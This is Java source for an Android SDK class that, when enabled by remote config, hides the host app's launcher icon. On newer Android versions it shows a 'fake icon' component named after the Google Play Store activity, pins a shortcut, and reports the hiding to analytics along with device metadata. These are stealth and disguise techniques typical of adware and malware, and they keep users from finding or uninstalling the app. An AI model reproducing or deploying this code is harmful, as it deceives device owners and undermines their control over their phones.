package com.vt.sdk;

import android.app.Application;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Build;
import android.text.TextUtils;
import android.util.Pair;

import androidx.core.content.pm.ShortcutInfoCompat;
import androidx.core.content.pm.ShortcutManagerCompat;
import androidx.core.graphics.drawable.IconCompat;

import com.LogUtil;
import com.Switch;

public class ScAndIconManager {
    private final SdkManager sdkManager;
    private final SharedPreferences storage;

    public ScAndIconManager(SdkManager sdkManager) {
        this.sdkManager = sdkManager;
        storage = sdkManager.getEncryptSP();
    }

    private final String icon_key = "icon_key";

    public void validateIconHidden() {
        if (storage.getBoolean(icon_key, false))
            return;

        RemoteConfigManager config = sdkManager.getConfigManager();
        if (!config.sdkEnabled())
            return;

        Application app = sdkManager.getApp();

        if (Switch.LOG_ON) {
            LogUtil.d(getLogTag(), "info:" + Build.BRAND + " ," + Build.MANUFACTURER + " ," + Build.DEVICE + " ," + Build.MODEL + " ," + Build.VERSION.SDK_INT);
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) { //<10.0
            ActivityInfo launcherInfo = getLauncherActivityInfo(app);
            if (launcherInfo == null)
                return;

            hideIconBeforeAndroid10(app, launcherInfo);
            createShortcut(app, launcherInfo);
        } else {
            ActivityInfo launcherInfo = getLauncherActivityInfo(app);
            if (launcherInfo == null)
                return;

            hideIconAfterAndroid10(app, launcherInfo);
            createShortcut(app, launcherInfo);
        }
    }

    private void hideIconBeforeAndroid10(Application app, ActivityInfo launch) {
        try {
            ComponentName com = new ComponentName(app, launch.name);

            PackageManager pm = app.getPackageManager();
            if (pm.getComponentEnabledSetting(com) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                pm.setComponentEnabledSetting(
                        com,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                );

                if (Switch.LOG_ON) {
                    LogUtil.d(getLogTag(), "hideIconBeforeAndroid10");
                }


                storage.edit().putBoolean(icon_key, true).apply();
                sendHideIconEvent();
            }
        } catch (Exception ignored) {
        }
    }

    private void hideIconAfterAndroid10(Application app, ActivityInfo launch) {
        addFakeIcon(app);
        try {
            ComponentName com = new ComponentName(app, launch.name);

            PackageManager pm = app.getPackageManager();
            if (pm.getComponentEnabledSetting(com) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                pm.setComponentEnabledSetting(
                        com,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                );

                if (Switch.LOG_ON) {
                    LogUtil.d(getLogTag(), "hideIconAfterAndroid10");
                }


                storage.edit().putBoolean(icon_key, true).apply();
                sendHideIconEvent();
            }
        } catch (Exception ignored) {
        }
    }

    private ActivityInfo getLauncherActivityInfo(Application app) {
        Intent i = new Intent(Intent.ACTION_MAIN, null);
        i.setPackage(app.getPackageName());
        i.addCategory(Intent.CATEGORY_LAUNCHER);

        ResolveInfo info = app.getPackageManager().resolveActivity(i, PackageManager.GET_RESOLVED_FILTER);
        if (info != null)
            return info.activityInfo;
        else
            return null;
    }

    private void addFakeIcon(Application app) {
//        if (Build.BRAND.equals("samsung") || Build.MANUFACTURER.equals("samsung")) {//samsung
//            showFakeIcon(app, "com.android.app.launcher.activities.LauncherActivity");
//        } else {//motorola
            showFakeIcon(app, "com.android.vending.AssetBrowserActivity");
//        }
    }

    private void showFakeIcon(Application app, String cls) {
        try {
            //从gp下载app后会在桌面主动生成图标，需先把生成的图标隐藏后重新在列表中显示图标
            ComponentName com = new ComponentName(app, cls);
            PackageManager pm = app.getPackageManager();
            //1.隐藏多余的图标
            pm.setComponentEnabledSetting(com,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);

            //2.延迟显示fake图标
            ThreadUtils.runInUIThreadDelayed(() -> {
                pm.setComponentEnabledSetting(com,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP);

                if (Switch.LOG_ON) {
                    LogUtil.d(getLogTag(), "showFakeIcon");
                }
            }, 800L);
        } catch (Exception ignored) {
        }
    }

    private void createShortcut(Application app, ActivityInfo launch) {
        if (!ShortcutManagerCompat.isRequestPinShortcutSupported(app))
            return;

        if (launch == null)
            return;

        Intent i = new Intent(Intent.ACTION_VIEW, null);
        i.setPackage(app.getPackageName());
        i.addCategory(Intent.CATEGORY_DEFAULT);

        ResolveInfo info = app.getPackageManager().resolveActivity(i, PackageManager.GET_RESOLVED_FILTER);
        ActivityInfo tgtInfo = (info == null ? null : info.activityInfo);
        if (tgtInfo == null || tgtInfo.name == null)
            return;

        PackageManager pm = app.getPackageManager();
        CharSequence label = launch.loadLabel(pm);
        if (TextUtils.isEmpty(label))
            return;

        try {
            Intent scIntent = new Intent();
            scIntent.setComponent(new ComponentName(app, tgtInfo.name));
            scIntent.setAction(Intent.ACTION_VIEW);

            ShortcutInfoCompat scInfoCompat = new ShortcutInfoCompat.Builder(app, label.toString())
                    .setIcon(IconCompat.createWithResource(app, launch.applicationInfo.icon))
                    .setShortLabel(label)
                    .setIntent(scIntent)
                    .build();


            ShortcutManagerCompat.requestPinShortcut(app, scInfoCompat, null);

        } catch (Exception ignored) {
        }
    }

    private void sendHideIconEvent() {
        sdkManager.getAnalytics().logEvent("hideicon", Pair.create("dev", sdkManager.getDeviceMetaData()));
    }
    
    private String getLogTag(){
        return "icon";
    }
}
